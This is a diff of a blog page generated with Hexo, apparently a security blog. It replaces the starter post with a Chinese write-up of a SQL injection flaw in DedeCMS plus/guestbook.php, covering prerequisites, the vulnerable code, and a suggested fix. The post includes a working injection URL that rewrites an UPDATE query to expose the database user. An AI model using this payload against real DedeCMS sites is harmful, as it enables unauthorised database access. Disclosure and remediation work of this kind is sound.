@@ -102,7 +102,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="fengxuan 安全" />
+  <meta name="keywords" content="dedecms,php,sqli,guestbook.php," />
 
 
 
@@ -118,17 +118,21 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="description" content="#dedecms plus/guestbook.php注入漏洞 dedecms plus/guestbook.php 由于没有过滤完善导致存在注入漏洞。 需要前提  1 有dede_guestbook表2 关闭了magic_quote_gpc，不会对单引号转义  利用(poc) 点击[回复/编辑]可以在url上看到评论的id，然后记录这个id plus/guestbook.php?action=a">
+<meta name="keywords" content="dedecms,php,sqli,guestbook.php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://www.evalshell.com/2017/08/13/hello-world/index.html">
+<meta property="og:title" content="dede_guestbook_sqli">
+<meta property="og:url" content="http://www.evalshell.com/2017/08/17/dede-guestbook-sqli/index.html">
 <meta property="og:site_name" content="fengxuan&#39;s blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="#dedecms plus/guestbook.php注入漏洞 dedecms plus/guestbook.php 由于没有过滤完善导致存在注入漏洞。 需要前提  1 有dede_guestbook表2 关闭了magic_quote_gpc，不会对单引号转义  利用(poc) 点击[回复/编辑]可以在url上看到评论的id，然后记录这个id plus/guestbook.php?action=a">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-06T04:01:44.000Z">
+<meta property="og:image" content="http://www.evalshell.com/uploads/images/dede_guestbook/dede_root.png">
+<meta property="og:image" content="http://www.evalshell.com/uploads/images/dede_guestbook/echosql.png">
+<meta property="og:updated_time" content="2017-08-16T17:15:24.033Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="dede_guestbook_sqli">
+<meta name="twitter:description" content="#dedecms plus/guestbook.php注入漏洞 dedecms plus/guestbook.php 由于没有过滤完善导致存在注入漏洞。 需要前提  1 有dede_guestbook表2 关闭了magic_quote_gpc，不会对单引号转义  利用(poc) 点击[回复/编辑]可以在url上看到评论的id，然后记录这个id plus/guestbook.php?action=a">
+<meta name="twitter:image" content="http://www.evalshell.com/uploads/images/dede_guestbook/dede_root.png">
 
 
 
@@ -157,13 +161,13 @@
 
 
 
-  <link rel="canonical" href="http://www.evalshell.com/2017/08/13/hello-world/"/>
+  <link rel="canonical" href="http://www.evalshell.com/2017/08/17/dede-guestbook-sqli/"/>
 
 
 
 
 
-  <title>Hello World | fengxuan's blog</title>
+  <title>dede_guestbook_sqli | fengxuan's blog</title>
   
 
 
@@ -310,7 +314,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/13/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/17/dede-guestbook-sqli/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fengxuan">
@@ -327,7 +331,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hello World</h1>
+          <h1 class="post-title" itemprop="name headline">dede_guestbook_sqli</h1>
         
 
         <div class="post-meta">
@@ -339,8 +343,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-13T15:21:04+08:00">
-                2017-08-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-17T00:05:42+08:00">
+                2017-08-17
               </time>
             
 
@@ -350,6 +354,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dedecms/" itemprop="url" rel="index">
+                    <span itemprop="name">dedecms</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -358,9 +384,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/08/13/hello-world/#comments" itemprop="discussionUrl">
+                <a href="/2017/08/17/dede-guestbook-sqli/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/08/13/hello-world/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2017/08/17/dede-guestbook-sqli/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -388,15 +414,48 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <p>#dedecms plus/guestbook.php注入漏洞</p>
+<p>dedecms plus/guestbook.php 由于没有过滤完善导致存在注入漏洞。</p>
+<p>需要前提</p>
+<blockquote>
+<p>1 有dede_guestbook表<br>2 关闭了magic_quote_gpc，不会对单引号转义</p>
+</blockquote>
+<h2 id="利用-poc"><a href="#利用-poc" class="headerlink" title="利用(poc)"></a>利用(poc)</h2><p> 点击[回复/编辑]可以在url上看到评论的id，然后记录这个id<br> plus/guestbook.php?action=admin&amp;job=editok&amp;id=评论id&amp;msg=’,msg=user(),email=’</p>
+<p>就能爆出用户名了</p>
+<p><img src="/uploads/images/dede_guestbook/dede_root.png" alt="mysql root"></p>
+<h2 id="漏洞原理-principle"><a href="#漏洞原理-principle" class="headerlink" title="漏洞原理(principle)"></a>漏洞原理(principle)</h2><p>/plus/guestbook.php 第16－19行</p>
+<pre><code>if($action==&apos;admin&apos;)
+{
+    include_once(dirname(__FILE__).&apos;/guestbook/edit.inc.php&apos;);
+    exit();
+}
+</code></pre><p>如果action=admin的话就直接调用/guestbook/edit.inc.php文件进行处理</p>
+<p>查看/guestbook/edit.inc.php文件</p>
+<pre><code>else if($job==&apos;editok&apos;)
+{
+
+$remsg = trim($remsg);
+if($remsg!=&apos;&apos;)
+{
+    //管理员回复不过滤HTML
+
+    ...
+}
+
+$dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&apos;$msg&apos;, `posttime`=&apos;&quot;.time().&quot;&apos; WHERE id=&apos;$id&apos; &quot;);
+ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);
+exit();
+}
+</code></pre><p>29－54行，如果job的参数是editok的话，就进入下面的逻辑，<code>$remsg</code>参数为空，下面的UPDATE操作直接将msg带入。</p>
+<pre><code>UPDATE `dede_guestbook` SET `msg`=&apos;&apos;,msg=user(),email=&apos;&apos;, `posttime`=&apos;1502903367&apos; WHERE id=&apos;1&apos; 
+</code></pre><p>打印出这条sql语句就是这样子。<strong>注意需要闭合</strong></p>
+<p><img src="/uploads/images/dede_guestbook/echosql.png" alt="mysql sqli"></p>
+<h2 id="修复方案-repair"><a href="#修复方案-repair" class="headerlink" title="修复方案(repair)"></a>修复方案(repair)</h2><p>其实可以看到织梦自己写了一个过滤评论html的函数</p>
+<p>这样修复即可    </p>
+<pre><code>$msg = trimMsg(cn_substrR($msg, 1024), 1);
+$dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&apos;$msg&apos;, `posttime`=&apos;&quot;.time().&quot;&apos; WHERE id=&apos;$id&apos; &quot;);
+</code></pre><p>带入查询之前先过滤下。</p>
+<h2 id="参考链接-link"><a href="#参考链接-link" class="headerlink" title="参考链接(link)"></a>参考链接(link)</h2><p><a href="http://www.51php.com/dedecms/16942.html" target="_blank" rel="external">http://www.51php.com/dedecms/16942.html</a></p>
 
       
     </div>
@@ -420,6 +479,18 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/dedecms/" rel="tag"># dedecms</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/sqli/" rel="tag"># sqli</a>
+          
+            <a href="/tags/guestbook-php/" rel="tag"># guestbook.php</a>
+          
+        </div>
+      
 
       
       
@@ -429,8 +500,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/07/new-atrlcle/" rel="next" title="new atrlcle">
-                <i class="fa fa-chevron-left"></i> new atrlcle
+              <a href="/2017/08/14/dede-search-sqli/" rel="next" title="dedecms plus/search.php 注入漏洞">
+                <i class="fa fa-chevron-left"></i> dedecms plus/search.php 注入漏洞
               </a>
             
           </div>
@@ -438,10 +509,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/14/dede-search-sqli/" rel="prev" title="dedecms plus/search.php 注入漏洞">
-                dedecms plus/search.php 注入漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -595,7 +662,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-poc"><span class="nav-number">1.</span> <span class="nav-text">利用(poc)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理-principle"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理(principle)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方案-repair"><span class="nav-number">3.</span> <span class="nav-text">修复方案(repair)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接-link"><span class="nav-number">4.</span> <span class="nav-text">参考链接(link)</span></a></li></ol></div>
             
 
           </div>
@@ -751,9 +818,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://www.evalshell.com/2017/08/13/hello-world/';
-          this.page.identifier = '2017/08/13/hello-world/';
-          this.page.title = 'Hello World';
+          this.page.url = 'http://www.evalshell.com/2017/08/17/dede-guestbook-sqli/';
+          this.page.identifier = '2017/08/17/dede-guestbook-sqli/';
+          this.page.title = 'dede_guestbook_sqli';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://.disqus.com/embed.js';
